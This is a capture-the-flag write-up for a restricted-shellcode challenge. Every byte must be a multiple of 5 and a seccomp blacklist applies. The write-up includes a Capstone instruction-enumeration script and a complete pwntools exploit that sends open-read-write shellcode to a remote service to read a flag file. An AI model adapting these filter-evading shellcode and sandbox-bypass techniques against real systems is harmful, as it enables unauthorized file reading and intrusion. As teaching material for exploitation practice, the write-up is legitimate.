Analyzing the binary reveals a pure shellcode challenge with extremely strict constraints: every byte must be a **multiple of 5**. Additionally, a seccomp sandbox is active:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x25 0x00 0x01 0x00010000  if (A <= 0x10000) goto 0006
 0005: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0006: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0008
 0007: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0008: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0010
 0009: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
 0011: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0016: 0x15 0x00 0x01 0x0000002c  if (A != sendto) goto 0018
 0017: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0018: 0x15 0x00 0x01 0x0000002d  if (A != recvfrom) goto 0020
 0019: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0020: 0x15 0x00 0x01 0x00000028  if (A != sendfile) goto 0022
 0021: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0022: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0024
 0023: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0024: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0026
 0025: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0026: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0028
 0027: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0028: 0x15 0x00 0x01 0x0000000b  if (A != munmap) goto 0030
 0029: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0030: 0x15 0x00 0x01 0x00000019  if (A != mremap) goto 0032
 0031: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0032: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

The blacklist disables many common syscalls. The only viable path is to write an **ORW (Open-Read-Write)** shellcode in one go. After analyzing the blacklist, a syscall chain for ORW can be identified: `openat` + `pread/readv` + `writev`.

Before jumping to the shellcode, all 64-bit general-purpose registers (except `rax`) are set to `0xdeadbeeffaceb00c`, and all `xmm` registers are zeroed. There are 7 bytes of fixed instructions (`and rax, r11` and `cmovno rax, r11`) before the controllable shellcode, which also set `rax` to `0xdeadbeeffaceb00c`.

### 1. Finding the Instruction Set

We use the **Capstone** engine to enumerate instructions with prefixes up to four bytes where every byte is a multiple of 5:

```Python
import capstone
from itertools import product

cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)

def disasm(code, addr=0):
    for i in cs.disasm(code, addr):
        return ('%s %s' % (i.mnemonic, i.op_str)), i.size
    else:
        assert False, code.hex()

s = bytearray(10)

disasm_dict = {}
l = 4
for bs in product(range(0x00, 0x100, 5), repeat=l):
    # print(bs)
    s[: l] = bytes(bs)
    try:
        in_dict = False
        for i in range(1, l):
            if bytes(s[: i]) in disasm_dict:
                in_dict = True
                break
        if in_dict: continue
        code, size = disasm(s)
        # if size > l: size = l
        disasm_dict[bytes(s[: size])] = code
        print('%20s: %s' % (s[: size].hex(), code))
    except:
        pass
```

By manually searching the output, we can find primitives for register manipulation. Here are a few examples:

```
eax, ecx, r8d, ebp, r11d, r13d:
    b9 +imm32: mov ecx, imm32
    91: xchg ecx, eax
    ffc8: dec eax
    4b05 +imm32: add rax, imm32
    4b2d +imm32: sub rax, imm32
    4b87c8: xchg r8, rcx
    87cd: xchg ebp, ecx
    4b87c3: xchg r11, rax
    4b87cd: xchg r13, rcx

esi:
    be +imm32: mov esi, imm32

r14d:
    41be +imm32: mov r14d, imm32

r9d:
    41b9 +imm32: mov r9d, imm32
```

Indeed, there is immense creative room in this part of the process, as many such primitives can be found.

### 2. Memory Access and Address Leaks

Since we need to perform ORW, we need a writable memory region. Many `fs` segment-related instructions are available in the restricted set. Reading `fs:0` provides the `fs_base` value, which gives us a usable read/write address. Useful instructions include:

- `644b0f4100`: `cmovno rax, qword ptr fs:[r8]`
- `644b8700`: `xchg qword ptr fs:[r8], rax`
- `644b8723`: `xchg qword ptr fs:[r11], rsp`

Most available instructions are `xchg`, meaning we might only get one chance to use `fs:0` easily. If we use the `cmovno` instruction, we can achieve a `mov`-like effect to copy the address. Combined with `add rax, imm32` and `sub rax, imm32`, we can perform limited memory addressing.

### 3. Writing to Memory

To write the `flag` path into memory, we can use the `xchg` instructions mentioned above or more precise single-byte write instructions like `0087 +imm32`: `add byte ptr [rdi + imm32], al`. This specific exploit utilizes: `64410fc300`: `movnti dword ptr fs:[r8], eax`.

Once these primitives are solved, the rest is straightforward: combine these primitives to construct the full ORW logic as seen in the `exp.py`.

```python
#!/usr/bin/env python3

from pwn import *

# p = process('./childcode')
p = remote('192.168.87.129', 9999)

context.arch = 'amd64'

lines = '''
: // zero registers for later use
b900000000: mov ecx, 0
4b87c8: xchg r8, rcx // r8 = 0
b900000000: mov ecx, 0
4b87cd: xchg r13, rcx // r13 = 0
b900000000: mov ecx, 0
87cd: xchg ebp, ecx // rbp = 0
b900000000: mov ecx, 0 // rcx = 0
64234119: and eax, dword ptr fs:[rcx + 0x19]
4b87c3: xchg r11, rax // r11 = 0
be00000000: mov esi, 0 // rsi = 0
41be00000000: mov r14d, 0 // r14 = 0
41b900000000: mov r9d, 0 // r9 = 0

644b0f4100: cmovno rax, qword ptr fs:[r8] // get fs_base
644b8723: xchg qword ptr fs:[r11], rsp // rsp = fs_base

644b8700: xchg qword ptr fs:[r8], rax
644b0f4100: cmovno rax, qword ptr fs:[r8]
644b877300: xchg qword ptr fs:[r11], rsi
4b87f5: xchg r13, rsi // r13 = fs_base
644b8700: xchg qword ptr fs:[r8], rax // fs:0 still saves fs_base

55: push rbp
5f: pop rdi // rdi = 0
55: push rbp
5a: pop rdx // rdx = 0

55: push rbp // zero buffer to set flag path
55: push rbp
55: push rbp
55: push rbp
55: push rbp
55: push rbp
55: push rbp
55: push rbp
4bffcd: dec r13
4bffcd: dec r13
4bffcd: dec r13
4bffcd: dec r13 // r13 = fs_base - 4
4bffc8: dec r8
4bffc8: dec r8
4bffc8: dec r8
4bffc8: dec r8 // r8 = -4
'''
codes = ''.join(line.split(':')[0].strip() for line in lines.strip().splitlines())

for i in b'/flag'[::-1]:
    codes += '4bffc8' # dec r8
    codes += '4bffcd' # dec r13
    codes += '64418700' # xchg dword ptr fs:[r8], eax
    if i > 0:
        codes += '05' + ((i + 4) // 5 * 5).to_bytes(4, 'little').hex() # add eax, 5 * n
    if i % 5:
        codes += 'ffc8' * (5 - i % 5) # dec eax
    codes += '64410fc300' # movnti dword ptr fs:[r8], eax

for i in (-100 & 0xffffffff).to_bytes(4, 'big'):
    codes += '4bffc8' # dec r8
    codes += '64418700' # xchg dword ptr fs:[r8], eax
    if i > 0:
        codes += '05' + ((i + 4) // 5 * 5).to_bytes(4, 'little').hex() # add eax, 5 * n
    if i % 5:
        codes += 'ffc8' * (5 - i % 5) # dec eax
    codes += '64410fc300' # movnti dword ptr fs:[r8], eax

codes += '6441877800' # xchg dword ptr fs:[r8], edi // edi = -100
codes += '4b87f5' # xchg r13, rsi // rsi = b'/flag'

codes += 'b9ff000000' # mov ecx, 0xff
codes += '91' # xchg ecx, eax
codes += '0505000000' # add eax, 0x05
codes += 'ffc8ffc8ffc8' # dec eax; dec, eax; dec eax // eax = 0x101
codes += '0f05' # syscall
# return fd = 3

# pread(3, buf, count, 0)
# rsi = buf
codes += 'b900000000' # mov ecx, 0
codes += '91' # xchg ecx, eax
codes += '4b87c3' # xchg r11, rax //                         r11 = 0
codes += 'b900000000' # mov ecx, 0
codes += '4b87c8' # xchg r8, rcx //                          r8 = 0
codes += '644b0f4100' # cmovno rax, qword ptr fs:[r8]
codes += '4b0550000000' # add rax, 0x50
codes += '644b8700' # xchg qword ptr fs:[r8], rax
codes += '644b877300' # xchg qword ptr fs:[r11], rsi // rsi = fs_base + 0x50
codes += '644b8700' # xchg qword ptr fs:[r8], rax

# edi = 3
codes += 'b905000000' # mov ecx, 5
codes += '91' # xchg ecx, eax
codes += 'ffc8ffc8' # dec eax; dec eax
codes += '50' # push rax
codes += '5f' # pop rdi

# rdx = 0xff
codes += 'b9ff000000' # mov ecx, ff
codes += '91' # xchg ecx, eax
codes += '50' # push rax
codes += '5a' # pop rdx

# r10 = 0
codes += '55' # push rbp // 0
codes += '415a' # pop r10

# eax = 17
codes += 'b914000000' # mov ecx, 20
codes += '91' # xchg ecx, eax
codes += 'ffc8ffc8ffc8' # dec eax; dec eax; dec eax

codes += '0f05' # syscall

# writev(1, {buf, len}, 1)
# rsi = {buf, len}
codes += 'b900000000' # mov ecx, 0
codes += '91' # xchg ecx, eax
codes += '4b87c3' # xchg r11, rax //                         r11 = 0
codes += '644b0f4100' # cmovno rax, qword ptr fs:[r8]
codes += '4b0528000000' # add rax, 0x28
codes += '644b8700' # xchg qword ptr fs:[r8], rax
codes += '644b8723' # xchg qword ptr fs:[r11], rsp // rsp = fs_base + 0x28
codes += '4b96' # xchg r14, rax
codes += 'b9ff000000' # mov ecx, 0xff
codes += '91' # xchg ecx, eax
codes += '50505050' # push rax; push rax; push rax; push rax
codes += '4b96' # xchg r14, rax
codes += '644b8700' # xchg qword ptr fs:[r8], rax
codes += '644b0f4100' # cmovno rax, qword ptr fs:[r8]
codes += '644b877300' # xchg qword ptr fs:[r11], rsi // rsi = fs_base + 0x50
codes += '4b0550000000' # add rax, 0x50
codes += '50' # push rax

# edi = 1
codes += 'b905000000' # mov ecx, 5
codes += '91' # xchg ecx, eax
codes += 'ffc8ffc8ffc8ffc8' # dec eax; dec eax; dec eax; dec eax
codes += '50' # push rax
codes += '5f' # pop rdi

# rdx = 0x1
codes += 'b905000000' # mov ecx, 5
codes += '91' # xchg ecx, eax
codes += 'ffc8ffc8ffc8ffc8' # dec eax; dec eax; dec eax; dec eax
codes += '50' # push rax
codes += '5a' # pop rdx

# eax = 20
codes += 'b914000000' # mov ecx, 20
codes += '91' # xchg ecx, eax

codes += '0f05' # syscall


codes = bytes.fromhex(codes)

# print(len(codes))
assert len(codes) < 0x1000

p.sendlineafter(b'codelen: ', str(len(codes)).encode())

# input()
p.sendafter(b'code: ', codes)
# p.shutdown('send')

p.interactive()
```

